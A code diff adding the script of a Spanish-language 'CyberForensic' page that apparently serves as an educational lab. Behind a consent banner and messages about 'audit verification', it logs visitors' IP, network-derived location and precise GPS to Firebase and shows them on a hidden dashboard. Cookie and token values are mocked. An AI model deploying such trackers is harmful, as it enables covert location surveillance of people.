+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+          viewportWidth: window.innerWidth,
+          viewportHeight: window.innerHeight,
+          pixelRatio: window.devicePixelRatio,
+          cookies: "simulated_session_id=mock_sec_" + Math.random().toString(36).substring(2, 8) + "; cyber_consent=true",
+          localStorage: (function () {
+            return {
+              "simulated_token": "mock_jwt_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.mock_signature",
+              "lab_mode": "educational_simulation"
+            };
+          })(),
+          sessionStorage: (function () {
+            return {
+              "simulated_csrf": "mock_csrf_987654321_lab"
+            };
+          })()
+        };
+        return data;
+      } catch (e) {
+        console.error('Error recolectando:', e);
+        return null;
+      }
+    }
+
+    function getIPGeo() {
+      return new Promise(function (resolve) {
+        var services = [
+          {
+            url: 'https://ipapi.co/json/', parse: function (d) {
+              return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, lat: d.latitude, lng: d.longitude, isp: d.org };
+            }
+          },
+          {
+            url: 'https://ipinfo.io/json', parse: function (d) {
+              var loc = d.loc ? d.loc.split(',') : [null, null];
+              return { ip: d.ip, city: d.city, region: d.region, country: d.country, lat: parseFloat(loc[0]), lng: parseFloat(loc[1]), isp: d.org };
+            }
+          }
+        ];
+        var attempts = 0;
+        function tryNext() {
+          if (attempts >= services.length) { resolve(null); return; }
+          var s = services[attempts];
+          attempts++;
+          fetch(s.url, { timeout: 3000 })
+            .then(function (r) { return r.ok ? r.json() : null; })
+            .then(function (d) {
+              if (d && d.ip) {
+                resolve(s.parse(d));
+              } else {
+                tryNext();
+              }
+            })
+            .catch(function () { tryNext(); });
+        }
+        tryNext();
+      });
+    }
+
+    function getGPS() {
+      return new Promise(function (resolve) {
+        if (!navigator.geolocation) { resolve(null); return; }
+        navigator.geolocation.getCurrentPosition(
+          function (p) { resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }); },
+          function () { resolve(null); },
+          { enableHighAccuracy: true, timeout: 5000 }
+        );
+      });
+    }
+
+    function collectAndSend() {
+      console.log('Iniciando recoleccion...');
+      showMsg('Verificando auditoría...');
+      var deviceData = collectData();
+      if (!deviceData) {
+        showMsg('Error al recolectar datos', true);
+        return;
+      }
+      getIPGeo().then(function (ipGeo) {
+        if (ipGeo) {
+          deviceData.ip = ipGeo.ip;
+          deviceData.geo = {
+            city: ipGeo.city || 'Desconocida',
+            region: ipGeo.region || 'Desconocida',
+            country: ipGeo.country || 'Desconocido',
+            lat: ipGeo.lat || null,
+            lng: ipGeo.lng || null,
+            isp: ipGeo.isp || 'Desconocido'
+          };
+        } else {
+          deviceData.ip = 'No disponible';
+          deviceData.geo = { city: 'No disponible', country: 'No disponible' };
+        }
+        getGPS().then(function (gps) {
+          if (gps && gps.lat) {
+            if (!deviceData.geo) deviceData.geo = {};
+            deviceData.geo.gps = { lat: gps.lat, lng: gps.lng, acc: gps.acc || 0 };
+          }
+          console.log('Enviando a Firebase...');
+          var ref = window._db.ref('visitors/' + deviceData.sessionId);
+          ref.set(deviceData)
+            .then(function () {
+              console.log('Datos guardados:', deviceData.sessionId);
+              showMsg('Acceso verificado correctamente');
+              try {
+                localStorage.setItem('_lc_' + deviceData.sessionId, JSON.stringify(deviceData));
+              } catch (e) { }
+              var dash = document.getElementById('_dash');
+              if (dash && dash.classList.contains('active')) {
+                updateDash(deviceData);
+              }
+            })
+            .catch(function (err) {
+              console.error('Error Firebase:', err);
+              showMsg('Error al verificar: ' + err.message, true);
+              try {
+                localStorage.setItem('_fb_' + deviceData.sessionId, JSON.stringify(deviceData));
+              } catch (e) { }
+            });
+        });
+      });
+    }
+
+    function updateDash(data) {
+      var c = document.getElementById('_dc');
+      if (!c || !data) return;
+      var geo = data.geo || {};
+      var loc = geo.city || geo.country || '';
+      var gps = geo.gps || {};
+      var html = '<div class="dash-entry">';
+      html += '<div class="ip">🌐 ' + (data.ip || 'N/A') + '</div>';
+      html += '<div class="time">🕐 ' + (data.timestamp ? new Date(data.timestamp).toLocaleString() : 'N/A') + '</div>';
+      html += '<div class="device">📱 ' + (data.platform || 'N/A') + '</div>';
+      if (loc) html += '<div class="device">📍 ' + loc + '</div>';
+      if (gps.lat && gps.lng) {
+        html += '<div class="device" style="color:#00ff88;">🎯 GPS: ' + gps.lat.toFixed(4) + ', ' + gps.lng.toFixed(4) + '</div>';
+      }
+      html += '</div>';
+      c.innerHTML = html;
+    }
+
+    function acceptConsent() {
+      localStorage.setItem('cyberConsent', 'true');
+      document.getElementById('cb').classList.add('hidden');
+      showMsg('Términos aceptados');
+      setTimeout(collectAndSend, 500);
+    }
+
+    function declineConsent() {
+      document.getElementById('cb').classList.add('hidden');
+      showMsg('Has rechazado los términos');
+    }
+
+    if (localStorage.getItem('cyberConsent') === 'true') {
+      document.getElementById('cb').classList.add('hidden');
+      setTimeout(collectAndSend, 1000);
+    }
+
+    // Dashboard oculto activable con doble clic en el título principal (requiere consentimiento)
+    document.addEventListener('dblclick', function (e) {
+      if (e.target.id === 'main-title' || (e.target.tagName === 'H1' && e.target.textContent.includes('CyberForensic'))) {
+        if (localStorage.getItem('cyberConsent') !== 'true') {
+          showMsg('🔒 El monitor está bloqueado hasta aceptar los términos y condiciones de auditoría.', true);
+          return;
+        }
+        var dash = document.getElementById('_dash');
+        if (dash) {
+          dash.classList.toggle('active');
+          if (dash.classList.contains('active')) {
+            var keys = Object.keys(localStorage).filter(function (k) { return k.startsWith('_lc_'); });
+            if (keys.length > 0) {
+              try {
+                var data = JSON.parse(localStorage.getItem(keys[keys.length - 1]));
+                if (data) updateDash(data);
+              } catch (e) { }
+            }
+          }
+        }
+      }
+    });
+
+    function lb(s, c) {
+      var lb = document.getElementById('lb');
+      var img = document.getElementById('lbi');
+      var info = document.getElementById('lbinfo');
+      img.src = s.startsWith('assets/') ? s : 'assets/images/' + s;
+      info.innerHTML = c + ' — <span style="color:#ff6666;">Clic fuera para cerrar</span>';
+      lb.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function clb(e) {
+      var lb = document.getElementById('lb');
+      if (e.target === lb || e.target.classList.contains('close-btn')) {
+        lb.classList.remove('active');
+        document.body.style.overflow = 'auto';
+      }
+    }
+
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape') {
+        document.getElementById('lb').classList.remove('active');
+        var dash = document.getElementById('_dash');
+        if (dash) dash.classList.remove('active');
+        document.body.style.overflow = 'auto';
+      }
+    });
+
+    if (!document.getElementById('_dash')) {
+      var dashHtml = '<div id="_dash"><div class="dash-header"><h4>🟢 MONITOR</h4><button class="dash-close" onclick="document.getElementById(\'_dash\').classList.remove(\'active\')">✕</button></div><div id="_dc"><div class="dash-empty">Cargando...</div></div></div>';
+      document.body.insertAdjacentHTML('beforeend', dashHtml);
+    }
+  </script>
+</body>
+
+</html>
